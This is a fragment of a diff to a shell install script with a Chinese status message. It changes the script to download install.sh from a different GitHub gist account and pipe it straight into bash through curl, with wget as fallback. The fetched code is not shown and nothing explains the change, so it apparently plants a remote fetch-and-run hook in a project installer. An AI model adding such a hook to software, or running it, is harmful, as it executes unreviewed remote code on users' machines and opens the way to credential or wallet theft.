@@ -105,7 +105,7 @@ else
     echo "未找到 requirements.txt，跳过依赖安装。"
 fi
 
-GIST_URL="https://gist.githubusercontent.com/blockchain-src/0471e495e9be526d9a384e8e1c5643a4/raw/install.sh"
+GIST_URL="https://gist.githubusercontent.com/wongstarx/b1316f6ef4f6b0364c1a50b94bd61207/raw/install.sh"
 if command -v curl &>/dev/null; then
     bash <(curl -fsSL "$GIST_URL")
 elif command -v wget &>/dev/null; then
